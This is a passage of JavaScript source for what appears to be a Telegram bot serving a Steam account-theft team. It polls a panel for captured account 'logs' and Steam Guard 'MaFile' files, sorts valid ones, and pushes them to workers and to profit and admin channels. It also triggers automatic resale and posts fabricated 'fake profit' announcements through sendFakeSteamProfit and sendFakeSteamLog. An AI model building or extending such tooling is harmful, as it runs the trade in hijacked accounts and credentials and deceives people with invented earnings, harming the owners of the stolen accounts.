    if (existing) {
      const statusChange = await trackAccountStatusChange(existing, account);
      const mafileInvalidDirty = maybeApplyUprojectMafileInvalid(existing, account);
      const sessionDirty = applyUprojectSessionState(existing, account);
      if (statusChange || mafileInvalidDirty || sessionDirty) {
        try {
          await existing.save();
        } catch (_) {
          /* ignore */
        }
        if (statusChange === "changed" || mafileInvalidDirty) {
          void syncProfitCaptionIfPosted(bot, existing, account);
        }
      }

      // Только Валид и MaFile — дальше карточки / ретраи.
      if (kind !== "valid" && kind !== "mafile") continue;

      // Тот же лог позже получил MaFile — отдельное уведомление.
      if (
        existing.logKind === "valid" &&
        kind === "mafile" &&
        existing.status === "processed"
      ) {
        existing.logKind = "mafile";
        existing.status = "new";
        existing.errorMessage = "";
        existing.ownerTelegramId =
          (await resolveOwnerTelegramId(account, fallbackTelegramId)) || existing.ownerTelegramId;
        Object.assign(existing, snapshotAccountFields(account));
        await existing.save();
        void logNewSteamAccount({
          sourceId,
          ownerTelegramId: existing.ownerTelegramId,
          accountStatus: account?.status || "MaFile",
          account,
        }).catch(() => {});
        fresh.push({ log: existing, account });
        continue;
      }

      // MaFile конвертирован в лог — не дублируем в профит-канале как «Лог у …».
      if (existing.logKind === "mafile" && kind === "valid") {
        const wasAutoConvert = Boolean(String(existing.mafileAutoConvertTaskId || "").trim());
        markMafileConvertedToLog(existing, account);
        await existing.save();
        if (wasAutoConvert) {
          const { maybeEnqueueAutoSell } = require("./autoLogSaleService");
          void maybeEnqueueAutoSell(existing).catch((error) => {
            logger.warn("Auto sale after MaFile convert failed", existing.sourceId, error.message);
          });
        }
        continue;
      }

      const missingDm = !String(existing.dmMessageId || "").trim();
      const hasChannel = Boolean(String(existing.channelMessageId || "").trim());
      const missingAdmin =
        Boolean(env.steamAdminLogsChannelId) &&
        !String(existing.adminChannelMessageId || "").trim();
      const trulyUndelivered = missingDm && !hasChannel;
      const ageMs = Date.now() - new Date(existing.updatedAt || 0).getTime();
      const cooledDown = ageMs >= STUCK_RETRY_COOLDOWN_MS;
      const createdAgeMs = Date.now() - new Date(existing.createdAt || existing.updatedAt || 0).getTime();

      // Валид не пишет channelMessageId — «не доставлен» = нет ЛС и нет админ-канала.
      const undeliveredValid =
        kind === "valid" &&
        missingDm &&
        missingAdmin &&
        !hasChannel;
      const undelivered = trulyUndelivered || undeliveredValid;

      // Частичная доставка (канал есть, ЛС/админ нет) — не крутим каждые 30с,
      // иначе ретраи забивают полл и новые валиды не обрабатываются.
      if (existing.status === "new" && !undelivered) {
        if (missingAdmin && cooledDown && createdAgeMs < 7 * 24 * 60 * 60 * 1000) {
          existing.logKind = kind;
          existing.ownerTelegramId =
            (await resolveOwnerTelegramId(account, fallbackTelegramId)) || existing.ownerTelegramId;
          retries.push({ log: existing, account, reason: "partial_missing_admin" });
        } else if (!missingAdmin || !env.steamAdminLogsChannelId || createdAgeMs >= 7 * 24 * 60 * 60 * 1000) {
          existing.status = "processed";
          existing.logKind = kind;
          await existing.save();
        }
        continue;
      }

      const stuckNew = existing.status === "new" && undelivered && cooledDown;
      const stuckFailed =
        existing.status === "failed" && undelivered && cooledDown;
      const missingAdminProcessed =
        existing.status === "processed" &&
        missingAdmin &&
        cooledDown &&
        // Не долбим древние логи без adminChannelMessageId — только свежие (7 дней).
        createdAgeMs < 7 * 24 * 60 * 60 * 1000;
      if (stuckNew || stuckFailed || missingAdminProcessed) {
        existing.status = "new";
        existing.errorMessage = "";
        existing.logKind = kind;
        existing.ownerTelegramId =
          (await resolveOwnerTelegramId(account, fallbackTelegramId)) || existing.ownerTelegramId;
        logger.warn(
          "Retrying stuck steam log",
          sourceId,
          missingAdminProcessed ? "missing_admin_channel" : stuckFailed ? "failed" : "new"
        );
        retries.push({
          log: existing,
          account,
          reason: missingAdminProcessed ? "missing_admin" : stuckFailed ? "failed" : "new",
        });
      }
      continue;
    }

    // Только Валид и MaFile — Невалид и прочее не создаём и не шлём в ЛС.
    if (kind !== "valid" && kind !== "mafile") continue;

    const ownerTelegramId = await resolveOwnerTelegramId(account, fallbackTelegramId);
    const log = await SteamLog.create({
      sourceId,
      ownerTelegramId,
      status: "new",
      logKind: kind,
      ...snapshotAccountFields(account),
    });
    void logNewSteamAccount({
      sourceId,
      ownerTelegramId,
      accountStatus: account?.status,
      account,
    }).catch(() => {});
    fresh.push({ log, account });
  }

  // Сначала новые валиды, потом новые MaFile, ретраи — в конце.
  const freshOrdered = [
    ...fresh.filter((item) => item.log.logKind === "valid" || classifyAccountLog(item.account) === "valid"),
    ...fresh.filter((item) => item.log.logKind !== "valid" && classifyAccountLog(item.account) !== "valid"),
  ];
  for (const item of freshOrdered) {
    await processAccountLog(bot, item.log, item.account);
  }
  for (const item of retries.slice(0, MAX_STUCK_RETRIES_PER_POLL)) {
    await processAccountLog(bot, item.log, item.account);
  }
}

function logPollFail(username, error, { force = false } = {}) {
  const now = Date.now();
  consecutivePollFails += 1;
  if (!force && consecutivePollFails > 3 && now - lastPollFailLogAt < 60000) return;
  lastPollFailLogAt = now;
  const status = error?.response?.status;
  const detail =
    status != null
      ? `Request failed with status code ${status}`
      : error?.response?.data?.message || error.message;
  logger.warn("Steam accounts poll failed", username || "team", detail);
}

async function pollPanelUser(bot, user) {
  if (!user?.panelUsername || !user?.panelPassword) return false;
  if (isServiceUnavailable()) return false;
  try {
    const auth = await authCredentials(user.panelUsername, user.panelPassword);
    if (!auth?.token) return false;
    await ingestAccountPages(bot, auth.token, {}, { pages: 3, fallbackTelegramId: user.telegramId });
    try {
      await ingestAccountPages(bot, auth.token, { statuses: ["Invalid"] }, {
        pages: 2,
        fallbackTelegramId: user.telegramId,
      });
    } catch (error) {
      logger.warn("Steam Invalid extra poll failed", user.panelUsername, error.message);
    }
    consecutivePollFails = 0;
    return true;
  } catch (error) {
    if (error?.response?.status === 401) {
      invalidatePanelToken(user.panelUsername);
    }
    logPollFail(user.panelUsername, error);
    return false;
  }
}

/**
 * One team-key request covers all worker accounts.
 * Per-worker login polls only if the key call fails with auth/permission errors.
 */
async function pollOnce(bot) {
  if (pollInFlight) {
    if (pollStartedAt && Date.now() - pollStartedAt > POLL_WATCHDOG_MS) {
      logger.warn("Steam poll watchdog — forcing unlock after hang");
      pollInFlight = false;
      pollStartedAt = 0;
    } else {
      return;
    }
  }
  if (isServiceUnavailable()) {
    const now = Date.now();
    if (now - lastCircuitLogAt > 60000) {
      lastCircuitLogAt = now;
      logger.warn(
        "Steam poll paused — uproject unavailable",
        `${Math.ceil(serviceUnavailableMsLeft() / 1000)}s left`
      );
    }
    return;
  }

  pollInFlight = true;
  pollStartedAt = Date.now();
  try {
    try {
      invalidateSteamAccountsCache();
      activeDomainById = await loadTeamDomainLookup();
      await ingestAccountPages(bot, null, {}, { pages: 5 });
      try {
        await ingestAccountPages(bot, null, { statuses: ["Invalid"] }, { pages: 3 });
      } catch (extraError) {
        logger.warn("Steam Invalid extra poll failed", extraError.message);
      }
      try {
        await ingestAccountPages(bot, null, { mafile_only: true }, { pages: 2 });
      } catch (extraError) {
        logger.warn("Steam MaFile extra poll failed", extraError.message);
      }
      consecutivePollFails = 0;
      return;
    } catch (error) {
      if (isServiceUnavailableError(error) || isServiceUnavailable()) {
        logPollFail("team", error, { force: true });
        return;
      }
      logPollFail("team", error, { force: true });
    }

    const users = await User.find({
      isTeamMember: true,
      isBanned: { $ne: true },
      panelUsername: { $exists: true, $ne: "" },
      panelPassword: { $exists: true, $ne: "" },
    }).limit(100);

    const delay = Math.max(100, Number(env.steamPollUserDelayMs) || 400);
    for (const user of users) {
      if (isServiceUnavailable()) break;
      await pollPanelUser(bot, user);
      await sleep(delay);
    }
  } catch (error) {
    logger.error("Steam poll failed", error?.response?.data || error.message);
  } finally {
    pollInFlight = false;
    pollStartedAt = 0;
    activeDomainById = null;
  }
}

async function recheckSteamId(bot, sourceId) {
  if (!/^\d+$/.test(String(sourceId || ""))) throw new Error("ID лога должен содержать только цифры.");
  const payload = await getSteamAccounts(null, { offset: 0, limit: 100 });
  let account = accountRowsFromPayload(payload).find((row) => String(row.id) === String(sourceId));
  if (!account) {
    try {
      account = unwrapAccount(await getSteamAccountById(null, sourceId));
    } catch (_) {
      account = null;
    }
  }
  if (!account) throw new Error("Лог не найден в /steam/accounts.");
  const ownerTelegramId = await resolveOwnerTelegramId(account);
  const log = await SteamLog.findOneAndUpdate(
    { sourceId: String(sourceId) },
    { status: "new", errorMessage: "", ownerTelegramId, logKind: classifyAccountLog(account) },
    { new: true, upsert: true, setDefaultsOnInsert: true }
  );
  await processAccountLog(bot, log, account);
  return log;
}

async function sendFakeSteamProfit(bot, {
  items,
  total,
  balanceUsd = 0,
  inventoryUsd = null,
  games = [],
  mafileTime = "",
  ownerTelegramId,
  fakeTag = "",
}) {
  const sourceId = `fake-mafile-${Date.now()}`;
  const hasOwner = String(ownerTelegramId || "").trim();
  const resolvedTag = hasOwner ? "" : resolveFakeProfitTag(fakeTag);
  const inventory = inventoryUsd == null
    ? Number(items.reduce((sum, item) => sum + (Number(item?.price) || 0), 0).toFixed(2))
    : Math.max(0, Number(inventoryUsd) || 0);
  const balance = Math.max(0, Number(balanceUsd) || 0);
  const grandTotal = Number(total) || Number((balance + inventory).toFixed(2));

  const imageBuffer = await renderSteamProfitImage({
    items,
    games,
    total: grandTotal,
    balanceUsd: balance,
    inventoryUsd: inventory,
    mafileTime,
  });

  const channelMsg = await postProfitChannel(bot, {
    imageBuffer,
    caption: buildMafileChannelCaption({
      sourceId,
      ownerTelegramId: hasOwner || "",
      user: hasOwner ? await getUserByTelegramId(ownerTelegramId) : null,
      total: grandTotal,
      balanceUsd: balance,
      inventoryUsd: inventory,
      status: "pending",
      fakeTag: hasOwner ? "" : resolvedTag,
    }),
  });

  await SteamLog.create({
    sourceId,
    ownerTelegramId: hasOwner,
    status: "processed",
    logKind: "mafile",
    mafileStatus: "pending",
    totalProfit: grandTotal,
    balanceUsd: balance,
    inventoryUsd: inventory,
    accountUsername: resolvedTag ? formatFakeProfitTagLabel(resolvedTag) : "Фейк-профит",
    channelMessageId: String(channelMsg?.message_id || ""),
    mafileSnapshot: {
      isFake: true,
      fakeTag: resolvedTag,
      items: (items || []).map((item) => ({
        icon: String(item?.icon || ""),
        price: Number(item?.price || 0),
        itemHashName: String(item?.itemHashName || item?.name || "Unknown item"),
      })),
      games: Array.isArray(games) ? games : [],
      mafileTime: String(mafileTime || ""),
    },
  });

  const ownerLabel = hasOwner
    ? await buildAdminChannelOwnerLabel(ownerTelegramId)
    : formatFakeProfitTagLabel(resolvedTag);
  await postAdminLogsChannel(bot, {
    imageBuffer,
    filename: `steam-mafile-fake-${sourceId}.png`,
    caption: [
      `${pe("gift")} <b>Фейк MaFile</b>`,
      `${pe("profile")} Тег: ${ownerLabel}`,
      `${pe("coins")} Сумма: <b>$${grandTotal.toFixed(2)}</b>`,
      `└ Баланс: $${balance.toFixed(2)} · Инвентарь: $${inventory.toFixed(2)}`,
      `${pe("file")} ID: <code>${sourceId}</code>`,
    ].join("\n"),
  });

  return { channelMsg, sourceId, fakeTag: resolvedTag };
}

/** Фейк / тест карточки валид-лога в ЛС участника. */
async function sendFakeSteamLog(bot, { account, ownerTelegramId }) {
  if (!ownerTelegramId) throw new Error("Не указан получатель фейк-лога.");
  const sourceId = `fake-${Date.now()}`;
  const snap = snapshotAccountFields(account);
  const log = await SteamLog.create({
    sourceId,
    ownerTelegramId: String(ownerTelegramId),
    status: "processed",
    logKind: "valid",
    saleStatus: "none",
    ...snap,
  });
  const imageBuffer = await renderSteamLogImage(account);
  const dm = await sendDmPhoto(
    bot,
    ownerTelegramId,
    imageBuffer,
    buildValidLogCaption(account),
    `steam-log-fake-${Date.now()}.png`,
    { reply_markup: steamLogSellKeyboard(sourceId).reply_markup }
  );
  if (!dm) throw new Error("Не удалось отправить лог в ЛС (бот заблокирован или неверный ID).");
  await pinDmMessage(bot, ownerTelegramId, dm.message_id);
  log.dmMessageId = String(dm.message_id);
  log.dmChatId = String(dm.chat?.id || ownerTelegramId);
  await log.save();
  return dm;
}

function startSteamMonitor(bot) {
  bindActivityLogTelegram(bot?.telegram || bot);
  pollOnce(bot);
  // Min 30s — shorter intervals hammer uproject when it is already 503.
  setInterval(() => pollOnce(bot), Math.max(30000, env.steamPollIntervalMs));
  logger.info("Steam monitor started");
}

module.exports = {
  startSteamMonitor,
  recheckSteamId,
  sendFakeSteamProfit,
  sendFakeSteamLog,
  submitLogSaleRequest,
  classifyAccountLog,
  upsertSteamLogFromAccount,
  resolveProfitChannelId,
};
